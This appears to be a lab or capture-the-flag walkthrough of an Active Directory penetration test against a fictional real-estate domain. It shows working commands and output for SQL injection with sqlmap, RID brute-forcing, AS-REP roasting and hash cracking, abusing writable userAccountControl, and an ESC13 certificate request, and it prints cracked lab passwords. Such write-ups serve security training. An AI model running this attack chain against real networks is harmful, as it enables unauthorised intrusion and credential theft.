# Objective and Scope
North Stone, a premier luxury real estate marketplace, has engaged Hack Smarter for a full-scope penetration test. Your objective: identify critical vulnerabilities and demonstrate real-world business impact by achieving complete domain compromise.

The client has provided you with VPN access to their network, but no credentials.

I have also been provided a wordlist to use!

# Host file setup

```python
sudo nxc smb 10.1.209.181 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT dc.northstone.local                                        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 17:11 +0100
Nmap scan report for dc.northstone.local (10.1.209.181)
Host is up (0.097s latency).
rDNS record for 10.1.209.181: DC.northstone.local
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
47001/tcp open  winrm
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49679/tcp open  unknown
55203/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.37 seconds
```

After another check, port `88` and port `5985` are also open for some reason nmap missed it!
## Nmap
```python
nmap -p 53,80,88,135,139,389,445,636,3268,3269,3389 -A --min-rate=2000 -sT dc.northstone.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 17:13 +0100
Nmap scan report for dc.northstone.local (10.1.209.181)
Host is up (0.097s latency).
rDNS record for 10.1.209.181: DC.northstone.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: NorthStone | Coming Soon - US Real Estate Portal
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-29 16:13:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-29T16:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.northstone.local
| Not valid before: 2026-06-16T18:37:19
|_Not valid after:  2026-12-16T18:37:19
| rdp-ntlm-info: 
|   Target_Name: NORTHSTONE
|   NetBIOS_Domain_Name: NORTHSTONE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: northstone.local
|   DNS_Computer_Name: DC.northstone.local
|   DNS_Tree_Name: northstone.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-29T16:14:39+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1903 - 22H2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled as with all DCs but cannot use it to enumerate users or shares

The guest account is also disabled!

# HTTP (80)
![](Pasted%20image%2020260729172240.png)

Nuclei didnt find much, but it did detect MSSQL running which once again nmap missed!

After looking at the website, i see there isnt much functionality at all, there is no links

## Ffuf for subdomains

```python
ffuf -u http://northstone.local/ -w wordlist.txt -H 'Host: FUZZ.northstone.local' -ic -c -t 40 -fs 22687

testsql                 [Status: 200, Size: 26077, Words: 8271, Lines: 715, Duration: 115ms]
```

# `testsql` subdomain

It looks like there is a search function that looks to be pulling from a database!

![1063](Pasted%20image%2020260729173523.png)

Ill test some simple SQLi

![](Pasted%20image%2020260729173440.png)

After entering `'` into the search i get that error, which leaks credentials!

It also shows the query it ran, so i may be able to take SQLi even further!

Also doing a legitimate query like `villa` shows the agent email address, so its giving me valid users!

So ill use SQLmap to find the available databases

# SQLmap

```python
sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch

[17:44:41] [INFO] testing Microsoft SQL Server
[17:44:42] [INFO] confirming Microsoft SQL Server
[17:44:43] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 2019 or 11 or 10 or 2016
web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
back-end DBMS: Microsoft SQL Server 2019
[17:44:43] [INFO] fetching database names
available databases [5]:
[*] master
[*] model
[*] msdb
[*] NorthStoneDB
[*] tempdb
```

There are 4 default databases

`NorthStoneDB` is what the web app is pulling from

```python
sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB --tables

[17:47:02] [INFO] fetching tables for database: NorthStoneDB
Database: NorthStoneDB
[2 tables]
+-----------------+
| Properties      |
| auth_test_users |
+-----------------+
```

There is nothing inside the `auth_test_users` table

```python
sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB -T Properties --dump

[17:49:56] [INFO] fetching columns for table 'Properties' in database 'NorthStoneDB'
[17:49:56] [INFO] fetching entries for table 'Properties' in database 'NorthStoneDB'
Database: NorthStoneDB
Table: Properties
[36 entries]
+----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
| ID | Price      | Name                              | Location        | AgentName       | AgentEmail                       | AgentPhone      |
+----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
| 1  | $1,150,000 | Upper East Side Apartment         | New York, NY    | Chris Walker    | chris.walker@northstone.local    | +1-212-555-1001 |
| 2  | $1,850,000 | SoHo Loft                         | New York, NY    | Alex Morgan     | alex.morgan@northstone.local     | +1-212-555-1002 |
| 3  | $980,000   | Brooklyn Heights Condo            | New York, NY    | Sophia Blake    | sophia.blake@northstone.local    | +1-212-555-1003 |
| 4  | $2,400,000 | Manhattan Central Park View       | New York, NY    | Daniel Reed     | daniel.reed@northstone.local     | +1-212-555-1004 |
| 5  | $820,000   | Financial District Studio         | New York, NY    | Emma Collins    | emma.collins@northstone.local    | +1-212-555-1005 |
| 6  | $2,900,000 | Tribeca Luxury Apartment          | New York, NY    | Michael Stone   | michael.stone@northstone.local   | +1-212-555-1006 |
| 7  | $3,500,000 | Beverly Hills Residence           | Los Angeles, CA | Emily Stone     | emily.stone@northstone.local     | +1-310-555-2001 |
| 8  | $2,700,000 | Hollywood Hills Modern Home       | Los Angeles, CA | Ryan Cooper     | ryan.cooper@northstone.local     | +1-310-555-2002 |
| 9  | $1,600,000 | Santa Monica Beach Condo          | Los Angeles, CA | Megan Fox       | megan.fox@northstone.local       | +1-310-555-2003 |
| 10 | $2,200,000 | Downtown LA Penthouse             | Los Angeles, CA | Liam Scott      | liam.scott@northstone.local      | +1-310-555-2004 |
| 11 | $1,900,000 | Venice Canal House                | Los Angeles, CA | Olivia Brown    | olivia.brown@northstone.local    | +1-310-555-2005 |
| 12 | $1,250,000 | Westwood Family Home              | Los Angeles, CA | Noah Wilson     | noah.wilson@northstone.local     | +1-310-555-2006 |
| 13 | $1,300,000 | Miami Beach Ocean Apartment       | Miami, FL       | Carlos Diaz     | carlos.diaz@northstone.local     | +1-305-555-3001 |
| 14 | $1,100,000 | Brickell Financial District Condo | Miami, FL       | Isabella Cruz   | isabella.cruz@northstone.local   | +1-305-555-3002 |
| 15 | $920,000   | Downtown Miami Loft               | Miami, FL       | Mateo Alvarez   | mateo.alvarez@northstone.local   | +1-305-555-3003 |
| 16 | $1,700,000 | Coral Gables Residence            | Miami, FL       | Sofia Martinez  | sofia.martinez@northstone.local  | +1-305-555-3004 |
| 17 | $2,100,000 | Sunny Isles Luxury Apartment      | Miami, FL       | Lucas Fernandez | lucas.fernandez@northstone.local | +1-305-555-3005 |
| 18 | $1,250,000 | Edgewater Bay Condo               | Miami, FL       | Valentina Perez | valentina.perez@northstone.local | +1-305-555-3006 |
| 19 | $780,000   | Downtown Chicago Condo            | Chicago, IL     | Sophia Reed     | sophia.reed@northstone.local     | +1-312-555-4001 |
| 20 | $920,000   | River North Apartment             | Chicago, IL     | Liam Scott      | liam.scott@northstone.local      | +1-312-555-4002 |
| 21 | $1,400,000 | Gold Coast Luxury Condo           | Chicago, IL     | Emma Watson     | emma.watson@northstone.local     | +1-312-555-4003 |
| 22 | $1,150,000 | Lincoln Park Townhouse            | Chicago, IL     | Jacob Miller    | jacob.miller@northstone.local    | +1-312-555-4004 |
| 23 | $870,000   | Lakeview Modern Apartment         | Chicago, IL     | Ava Johnson     | ava.johnson@northstone.local     | +1-312-555-4005 |
| 24 | $1,900,000 | West Loop Penthouse               | Chicago, IL     | Ethan Brown     | ethan.brown@northstone.local     | +1-312-555-4006 |
| 25 | $4,500,000 | Luxury Oceanfront Villa           | Miami, FL       | Daniel Carter   | daniel.carter@northstone.local   | +1-305-555-5001 |
| 26 | $5,200,000 | Beverly Hills Private Villa       | Los Angeles, CA | Megan Fox       | megan.fox@northstone.local       | +1-310-555-5002 |
| 27 | $3,800,000 | Hamptons Style Villa              | New York, NY    | Chris Walker    | chris.walker@northstone.local    | +1-212-555-5003 |
| 28 | $4,200,000 | Modern Hillside Villa             | Los Angeles, CA | Ryan Cooper     | ryan.cooper@northstone.local     | +1-310-555-5004 |
| 29 | $3,600,000 | Mediterranean Estate Villa        | Miami, FL       | Carlos Diaz     | carlos.diaz@northstone.local     | +1-305-555-5005 |
| 30 | $4,900,000 | Contemporary Glass Villa          | Chicago, IL     | Sophia Reed     | sophia.reed@northstone.local     | +1-312-555-5006 |
| 31 | $2,400,000 | Oceanfront Beach House            | Miami, FL       | Lucas Fernandez | lucas.fernandez@northstone.local | +1-305-555-6001 |
| 32 | $2,900,000 | Santa Monica Beach House          | Los Angeles, CA | Olivia Brown    | olivia.brown@northstone.local    | +1-310-555-6002 |
| 33 | $3,700,000 | Malibu Cliffside Beach House      | Los Angeles, CA | Noah Wilson     | noah.wilson@northstone.local     | +1-310-555-6003 |
| 34 | $2,100,000 | Miami Sunset Beach House          | Miami, FL       | Valentina Perez | valentina.perez@northstone.local | +1-305-555-6004 |
| 35 | $3,200,000 | Luxury Private Beach Residence    | Miami, FL       | Mateo Alvarez   | mateo.alvarez@northstone.local   | +1-305-555-6005 |
| 36 | $3,500,000 | Exclusive Coastal Beach House     | Los Angeles, CA | Emily Stone     | emily.stone@northstone.local     | +1-310-555-6006 |
+----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
```

Ive found some users!

Ill place these into a file, and cut the output to get a user list!

```python
cat properties.txt | cut -d '|' -f 7 | cut -d ' ' -f 2 | cut -d '@' -f 1 > users.txt
```

Using this command i was able to place the users into a file

Now i can double check these are valid users using kerbrute!

# Kerbrute to validate users

```python
kerbrute userenum --dc dc.northstone.local -d northstone.local users.txt                                                      

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/29/26 - Ronnie Flathers @ropnop

2026/07/29 17:58:37 >  Using KDC(s):
2026/07/29 17:58:37 >  	dc.northstone.local:88

2026/07/29 17:58:38 >  Done! Tested 36 usernames (0 valid) in 0.396 seconds
```

None of those users are valid!

So turns out im stupid!

# Access to mssql instance as user `webapp`

![](Pasted%20image%2020260729180812.png)

So when i found this screenshot i didnt even think there was a username, i clearly missed it!

```python
nxc mssql dc.northstone.local -u webapp -p 'WebPass123!' --local-auth
MSSQL       10.1.209.181    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (EncryptionReq:False)
MSSQL       10.1.209.181    1433   DC               [+] DC\webapp:WebPass123!
```

I have access as this user

I can user this to get access to the mssql instance, however i have already checked the contents of it via SQLi, and also xp_cmdshell is not on and i dont have the permission to turn it on!

## Dumping users with mssql access

```python
nxc mssql dc.northstone.local -u webapp -p 'WebPass123!' --rid-brute 20000 --local-auth
MSSQL       10.1.209.181    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (EncryptionReq:False)
MSSQL       10.1.209.181    1433   DC               [+] DC\webapp:WebPass123! 
MSSQL       10.1.209.181    1433   DC               498: NORTHSTONE\Enterprise Read-only Domain Controllers
MSSQL       10.1.209.181    1433   DC               500: NORTHSTONE\Administrator
MSSQL       10.1.209.181    1433   DC               501: NORTHSTONE\Guest
MSSQL       10.1.209.181    1433   DC               502: NORTHSTONE\krbtgt
MSSQL       10.1.209.181    1433   DC               512: NORTHSTONE\Domain Admins
MSSQL       10.1.209.181    1433   DC               513: NORTHSTONE\Domain Users
MSSQL       10.1.209.181    1433   DC               514: NORTHSTONE\Domain Guests
MSSQL       10.1.209.181    1433   DC               515: NORTHSTONE\Domain Computers
MSSQL       10.1.209.181    1433   DC               516: NORTHSTONE\Domain Controllers
MSSQL       10.1.209.181    1433   DC               517: NORTHSTONE\Cert Publishers
MSSQL       10.1.209.181    1433   DC               518: NORTHSTONE\Schema Admins
MSSQL       10.1.209.181    1433   DC               519: NORTHSTONE\Enterprise Admins
MSSQL       10.1.209.181    1433   DC               520: NORTHSTONE\Group Policy Creator Owners
MSSQL       10.1.209.181    1433   DC               521: NORTHSTONE\Read-only Domain Controllers
MSSQL       10.1.209.181    1433   DC               522: NORTHSTONE\Cloneable Domain Controllers
MSSQL       10.1.209.181    1433   DC               525: NORTHSTONE\Protected Users
MSSQL       10.1.209.181    1433   DC               526: NORTHSTONE\Key Admins
MSSQL       10.1.209.181    1433   DC               527: NORTHSTONE\Enterprise Key Admins
MSSQL       10.1.209.181    1433   DC               553: NORTHSTONE\RAS and IAS Servers
MSSQL       10.1.209.181    1433   DC               571: NORTHSTONE\Allowed RODC Password Replication Group
MSSQL       10.1.209.181    1433   DC               572: NORTHSTONE\Denied RODC Password Replication Group
MSSQL       10.1.209.181    1433   DC               1000: NORTHSTONE\DC$
MSSQL       10.1.209.181    1433   DC               1101: NORTHSTONE\DnsAdmins
MSSQL       10.1.209.181    1433   DC               1102: NORTHSTONE\DnsUpdateProxy
MSSQL       10.1.209.181    1433   DC               1103: NORTHSTONE\SQLServer2005SQLBrowserUser$DC
MSSQL       10.1.209.181    1433   DC               1104: NORTHSTONE\svc_backup
MSSQL       10.1.209.181    1433   DC               1105: NORTHSTONE\c.mcgill
MSSQL       10.1.209.181    1433   DC               1106: NORTHSTONE\t.dalton
MSSQL       10.1.209.181    1433   DC               1108: NORTHSTONE\TempWinRMAccess
MSSQL       10.1.209.181    1433   DC               1109: NORTHSTONE\Certificate Enrollment Users
MSSQL       10.1.209.181    1433   DC               1110: NORTHSTONE\c.white
MSSQL       10.1.209.181    1433   DC               1111: NORTHSTONE\Software Maintainers
MSSQL       10.1.209.181    1433   DC               1112: NORTHSTONE\j.sullivan
MSSQL       10.1.209.181    1433   DC               1113: NORTHSTONE\m.harris
MSSQL       10.1.209.181    1433   DC               1114: NORTHSTONE\d.williams
MSSQL       10.1.209.181    1433   DC               1115: NORTHSTONE\k.bennett
MSSQL       10.1.209.181    1433   DC               1116: NORTHSTONE\r.parker
MSSQL       10.1.209.181    1433   DC               1117: NORTHSTONE\IT Support
MSSQL       10.1.209.181    1433   DC               1118: NORTHSTONE\b.ward
MSSQL       10.1.209.181    1433   DC               1119: NORTHSTONE\e.walker
MSSQL       10.1.209.181    1433   DC               1120: NORTHSTONE\l.turner
MSSQL       10.1.209.181    1433   DC               1121: NORTHSTONE\o.scott
MSSQL       10.1.209.181    1433   DC               1122: NORTHSTONE\IT Support Level 2
MSSQL       10.1.209.181    1433   DC               1123: NORTHSTONE\Print Services Operators
MSSQL       10.1.209.181    1433   DC               1125: NORTHSTONE\Database Backup Operators
```

So using `--rid-brute` i can dump all the users!

Ill edit this output a bit to make a user list!

# ASREP roasting

So now i have a valid user list i can try some as-rep roasting

```python
nxc ldap dc.northstone.local -u users.txt -p '' --asreproast asrep.hash                                       
LDAP        10.1.209.181    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (signing:None) (channel binding:Never) 
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.209.181    389    DC               $krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:250dff6930ccb4c916b488ecf7310662$0dea9dd5626575cee048b9e8c7a027e20a82c22197b1cc09d654bbebb41c231ad6f2a622f356e68ddabd4bf9fa417438740f272275427e9cc4beb792db1e9058a3dfad0f9fd913aaf1e785607c5b6f31a25538ac327b6d5955695bc58e4e7f3bb8d00676a8a2ec73ad6d2c4b47ec146cdfad07630872974ab2d14821d82c10186df408241f7975840cc72f1c88e44b1b5fcd48884dc32fbe8e0d40d65b7ff54e634c02f34c44e1e9d116556035e1278f7c40635747bfb9bfd586dd58c1265b131ecd3cd819e8497e412c6b25173e536a8160130af63eeb0756628a801d404201a6d49873d23e2f682f8d2733aa24d97eee430373
```

I have a hash

```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:250dff6930ccb4c916b488ecf7310662$0dea9dd5626575cee048b9e8c7a027e20a82c22197b1cc09d654bbebb41c231ad6f2a622f356e68ddabd4bf9fa417438740f272275427e9cc4beb792db1e9058a3dfad0f9fd913aaf1e785607c5b6f31a25538ac327b6d5955695bc58e4e7f3bb8d00676a8a2ec73ad6d2c4b47ec146cdfad07630872974ab2d14821d82c10186df408241f7975840cc72f1c88e44b1b5fcd48884dc32fbe8e0d40d65b7ff54e634c02f34c44e1e9d116556035e1278f7c40635747bfb9bfd586dd58c1265b131ecd3cd819e8497e412c6b25173e536a8160130af63eeb0756628a801d404201a6d49873d23e2f682f8d2733aa24d97eee430373:chuck102213
```

The hash cracked!

```python
c.mcgill:chuck102213
```

Ill validate these credentials!

```python
nxc smb dc.northstone.local -u c.mcgill -p 'chuck102213'                       
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\c.mcgill:chuck102213
```

I now have initial access!

Kerberoasting not possible

The user has no access over RDP or WINRM

The user only has read permissions on default shares

No GPP passwords in default SMB share

There is no password reuse

There is also nothing in bloodhound!

# UAC: WRITE on `t.dalton`

```python
bloodyAD --host dc.northstone.local -d northstone.local -u c.mcgill -p 'chuck102213' get writable --detail

distinguishedName: CN=Tony Dalton,CN=Users,DC=northstone,DC=local
userAccountControl: WRITE
```

This means i can alter this attribute

https://x3m1sec.gitbook.io/notes/pentest-notes/active-directory-pentesting/tools/bloodyad#enable-dont_req_preauth-for-asreproast

I can make it so that this account becomes AS-REP roastable!

```python
bloodyAD --host dc.northstone.local -d northstone.local -u c.mcgill -p 'chuck102213' add uac 't.dalton' -f DONT_REQ_PREAUTH
[+] ['DONT_REQ_PREAUTH'] property flags added to t.dalton's userAccountControl
```

Now the user should be AS-REP roastable!

```python
nxc ldap dc.northstone.local -u users.txt -p '' --asreproast asrep.hash                                
LDAP        10.1.209.181    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (signing:None) (channel binding:Never) 
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.209.181    389    DC               $krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:34897bf7ea202aeff8910f4d9d7bf048$11a4739d63ec0f0c86a7c4d19bb9fdfb9f51b5fbb82ef98a75c74e5fe5aa5988affec026c54ff42ef4b8ed15a5a56ccecdf1b1cb27c192cd0bc3c6310d38b14ed7a187373dac36802a453c6098ae011b6c5a7ea09acecd0fc5257b4f5b4a1696fffd08f9e5539d4a5675313e401bd8c026e28ab8444d2595d513cb7e62880fd214f34a51ae33353556d7cb9f86e6dce4f4a294c1e6d7ba11ee35904bf0fbf861c2b4306bef0fbf44df50fb39b45bc39556a5c871852bc2480e68c99841c96ca3c23d5031d0c1e5eae724fc9cc4bbf90f54f4a3e6373d4b345a10200f388c97c51f84c03a603c2731746f2c9a33196df18e87f76b
LDAP        10.1.209.181    389    DC               $krb5asrep$23$t.dalton@NORTHSTONE.LOCAL:73c32117161f3cd37e7907bc60731487$c688f2d08768c728a431aeb8f937011c644c61e010def8621ace5d36995c2ab23cc7cd20a84150697ce00734f989130f67c6856c8efd981fc875b73324bd5e5757d7a5940baa24bef75c265c65fd213da3e26144f28c45cd3a7f9f578ca79920227f896c944a77930fd636ea2026480202a974b23dabccfafc912289828dbb924cd3937b4b9eb1a17c284fa2c74b416b9706444c61bedee92c63d1e66f6603519edf29c34fdb07d42ec99355b0005e3589709d29eca2024bc59a1cf210eaa7c897def5525dc808c06b97d6ac7906187fb15bac43a18d7838d6e9f15465e00dae1670119449255ae7bbe8127065410d7d23dde056
```

Now ill see if the hash will crack!

```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:34897bf7ea202aeff8910f4d9d7bf048$11a4739d63ec0f0c86a7c4d19bb9fdfb9f51b5fbb82ef98a75c74e5fe5aa5988affec026c54ff42ef4b8ed15a5a56ccecdf1b1cb27c192cd0bc3c6310d38b14ed7a187373dac36802a453c6098ae011b6c5a7ea09acecd0fc5257b4f5b4a1696fffd08f9e5539d4a5675313e401bd8c026e28ab8444d2595d513cb7e62880fd214f34a51ae33353556d7cb9f86e6dce4f4a294c1e6d7ba11ee35904bf0fbf861c2b4306bef0fbf44df50fb39b45bc39556a5c871852bc2480e68c99841c96ca3c23d5031d0c1e5eae724fc9cc4bbf90f54f4a3e6373d4b345a10200f388c97c51f84c03a603c2731746f2c9a33196df18e87f76b:chuck102213
$krb5asrep$23$t.dalton@NORTHSTONE.LOCAL:73c32117161f3cd37e7907bc60731487$c688f2d08768c728a431aeb8f937011c644c61e010def8621ace5d36995c2ab23cc7cd20a84150697ce00734f989130f67c6856c8efd981fc875b73324bd5e5757d7a5940baa24bef75c265c65fd213da3e26144f28c45cd3a7f9f578ca79920227f896c944a77930fd636ea2026480202a974b23dabccfafc912289828dbb924cd3937b4b9eb1a17c284fa2c74b416b9706444c61bedee92c63d1e66f6603519edf29c34fdb07d42ec99355b0005e3589709d29eca2024bc59a1cf210eaa7c897def5525dc808c06b97d6ac7906187fb15bac43a18d7838d6e9f15465e00dae1670119449255ae7bbe8127065410d7d23dde056:123tonyd
```

The hash cracked!

```python
t.dalton:123tonyd
```

Ill validate these credentials!

```python
nxc smb dc.northstone.local -u 't.dalton' -p '123tonyd'              
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.209.181    445    DC               [+] northstone.local\t.dalton:123tonyd
```

This user is compromised!

# Enumeration as `t.dalton`

![](Pasted%20image%2020260729192524.png)

This user is a part of two interesting groups

```python
Software Maintianers Description:

Members of this group are granted limited write permissions on specific application directories within Program Files to support software updates and maintenance tasks
```

May also be worth checking ADCS

# ESC13 allows access to WINRM

```python
certipy-ad find -u t.dalton@northstone.local -p '123tonyd' -stdout -vulnerable

Certificate Authorities
  0
    CA Name                             : NORTHSTONE-CA
    DNS Name                            : DC.northstone.local
    Certificate Subject                 : CN=NORTHSTONE-CA, DC=northstone, DC=local
    Certificate Serial Number           : 46ED3A9B8650DAAD4538DC1C5C080F47
    Certificate Validity Start          : 2026-05-02 23:16:08+00:00
    Certificate Validity End            : 2031-05-02 23:26:08+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : NORTHSTONE.LOCAL\Administrators
      Access Rights
        ManageCa                        : NORTHSTONE.LOCAL\Administrators
                                          NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
        ManageCertificates              : NORTHSTONE.LOCAL\Administrators
                                          NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
        Enroll                          : NORTHSTONE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : TemporaryWinRM
    Certificate Authorities             : NORTHSTONE-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-05-02T23:44:12+00:00
    Template Last Modified              : 2026-05-03T06:18:56+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.6869607.4994610.3034790.7795668.5034561.159.11301662.5306190
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=northstone,DC=local
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NORTHSTONE.LOCAL\Certificate Enrollment Users
                                          NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : NORTHSTONE.LOCAL\Administrator
        Full Control Principals         : NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
        Write Owner Principals          : NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
        Write Dacl Principals           : NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
        Write Property Enroll           : NORTHSTONE.LOCAL\Domain Admins
                                          NORTHSTONE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : NORTHSTONE.LOCAL\Certificate Enrollment Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=northstone,DC=local'.
```

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked

```python
certipy-ad req -u 't.dalton@northstone.local' -p '123tonyd' -dc-ip '10.1.209.181' -target 'dc.northstone.local' -ca 'NORTHSTONE-CA' -template 'TemporaryWinRM' -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.1.209.181'
[+] DC IP: '10.1.209.181'
[+] DC Host: 'NORTHSTONE.LOCAL'
[+] Target IP: None
[+] Remote Name: 'dc.northstone.local'
[+] Domain: 'NORTHSTONE.LOCAL'
[+] Username: 'T.DALTON'
[+] Trying to resolve 'dc.northstone.local' at '10.1.209.181'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.1.209.181[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.1.209.181[\pipe\cert]
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 't.dalton@northstone.local'
[+] Found SID in security extension: 'S-1-5-21-2679383190-2392193949-2554118403-1106'
[*] Certificate object SID is 'S-1-5-21-2679383190-2392193949-2554118403-1106'
[*] Saving certificate and private key to 't.dalton.pfx'
